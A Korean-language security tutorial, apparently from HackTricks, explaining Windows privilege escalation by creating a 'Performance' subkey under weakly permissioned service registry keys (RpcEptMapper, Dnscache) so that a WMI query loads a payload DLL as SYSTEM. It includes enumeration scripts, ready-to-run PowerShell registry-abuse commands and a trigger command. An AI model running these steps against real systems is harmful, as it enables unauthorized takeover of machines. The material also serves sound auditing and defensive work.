# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**원문 게시물은** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## 요약

서비스 registry key에 대해 **`Create Subkey`** / **`AppendData/AddSubdirectory`** 권한만 있어도, 이것은 여전히 좋은 privesc 단서입니다. 보통은 **`ImagePath`**, **`ServiceDll`**, 또는 다른 기존 value를 직접 덮어쓸 수는 없지만, 다음 아래에 **`Performance`** 자식 key를 생성할 수는 있을 수 있습니다:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- 토큰이 **`KEY_CREATE_SUB_KEY`** 를 가진 다른 모든 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key

핵심은 Windows가 여전히 레거시 **PerfLib V1** 등록 모델을 지원한다는 점입니다. service에 **`Performance`** subkey가 있으면, performance counter consumer가 데이터를 요청할 때 Windows가 그곳에서 DLL을 로드할 수 있습니다.

Microsoft documentation에 따르면, 최소 등록은 다음과 같습니다:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
그래서 공격 측에서 핵심은: **`SetValue` 대신 `CreateSubKey`만 얻었다고 해서 service registry 발견을 그냥 버리면 안 된다**는 것입니다.

## 이것이 code execution에 충분한 이유

`Performance` 하위 키는 보통 이런 services에서 기본적으로 존재하지 않으므로, 필요한 primitive는 **`KEY_CREATE_SUB_KEY`** 입니다. 키가 생성되고 `Library`/`Open`/`Collect`/`Close`가 포함되면, 어떤 **performance counter consumer**라도 DLL load를 트리거할 수 있습니다.

몇 가지 중요한 세부 사항:

- **`Library`** 값은 **전체 DLL path**를 가리킬 수 있습니다.
- DLL은 **`OpenPerfData`**, **`CollectPerfData`**, **`ClosePerfData`**를 export해야 하며 `ERROR_SUCCESS`를 반환해야 합니다.
- 코드는 **consumer의 context**에서 실행되며, **반드시 취약한 service process 자체에서 실행되는 것은 아닙니다**.
- 전형적인 `RpcEptMapper` / `Dnscache` 사례에서는 **WMI performance query**가 **`wmiprvse.exe`**로 하여금 **`NT AUTHORITY\SYSTEM`** 권한으로 DLL을 load하게 만들 수 있습니다.

이것이 triage에서 이 primitive를 놓치기 쉬운 이유입니다: parent service key가 "완전히 writable"하지는 않지만, 여전히 weaponize할 수 있습니다.

## 빠른 enumeration

**AccessChk**로 수동 점검:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
서비스 키에서 **`CreateSubKey`** 권한이 있는 low-privileged principal을 찾는 PowerShell 예시:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
유용한 도구:

- **PrivescCheck**: `Get-ModifiableRegistryPath`는 이 유형의 문제를 찾기 위해 특별히 만들어졌다.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: DLL drop, `Performance` registration, WMI trigger, token duplication, cleanup을 레거시 취약 대상에서 자동화한다(예: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

`Performance` 하위 키를 만들고 필요한 값을 채운다:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
그런 다음 **privileged** performance consumer를 트리거하세요. 대표적인 예시는 `Win32_Perf*` 클래스에 대한 WMI query입니다:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
운영 노트:

- **`perfmon.exe`**를 실행하면 counter registration이 올바른지 확인하는 데 유용하지만, 보통은 DLL을 **자신의 사용자 컨텍스트**에서만 로드한다.
- 실제 LPE에서는 **WMI** 같은 **privileged** consumer를 트리거하라.
- 직접 exploit를 작성한다면, DLL 내부에서 `cmd.exe`를 바로 실행하면 보통 **session 0**에서 shell이 열린다. **Perfusion**은 공격자의 session에서 suspended 상태로 생성된 process에 privileged token을 복제하는 방식으로 이를 해결한다.
- DLL architecture를 target consumer에 맞춰라 (**x64 시스템에서는 x64**).

## Version notes / recent developments

역사적으로 내장된 weak keys는 다음과 같았다:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` 및 `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

**Perfusion**은 **2021년 4월** 업데이트로 인해 업데이트된 **Windows 8 / Windows Server 2012**에서는 쉬운 exploitation 경로가 제거되었지만, **Windows 7 / Windows Server 2008 R2**는 여전히 **`Dnscache`**를 통해 exploit 가능했다고 언급한다.

이 primitive는 **단지 과거의 것만은 아니다**. **2025년 1월**, Microsoft는 **`Network Configuration Operators`** 멤버가 **`Dnscache`** 및 **`NetBT`** 아래에 subkey를 만들 수 있던 관련 AD DS issue를 patch했으며, 같은 **Performance-counter DLL registration** 아이디어를 재사용해 지원되는 시스템에서 **SYSTEM**에 도달할 수 있었다.

따라서 현대적인 교훈은 일반적이다: low-privileged principal이 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** 에 대해 **`CreateSubKey`** 를 가진다면, findings를 무시하기 전에 **`Performance`** child key만으로 충분한지 확인하라.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
